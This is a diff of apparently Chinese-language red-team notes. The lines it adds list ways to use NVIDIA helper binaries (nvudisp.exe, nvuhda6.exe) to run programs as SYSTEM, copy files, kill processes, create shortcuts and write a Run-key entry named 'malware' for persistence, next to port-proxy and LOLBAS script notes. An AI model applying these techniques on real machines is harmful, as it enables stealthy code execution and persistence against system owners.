@@ -251,6 +251,12 @@ netsh interface portproxy reset
 修改psexec 源码的端口改为port1
 
 
+nvudisp.exe SYSTEM calc.exe
+nvuhda6.exe System calc.exe
+nvuhda6.exe Copy test.txt,test-2.txt
+nvuhda6.exe SetReg HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\malware=malware.exe
+nvuhda6.exe CreateShortcut test.lnk,"Test","c:\windows\system32\calc.exe","","c:\windows\system32"
+nvuhda6.exe KillApp calculator.exe
 
 c:\Windows\System32\gatherNetworkInfo.vbs
 c:\Windows\System32\SyncAppvPublishingServer.vbs
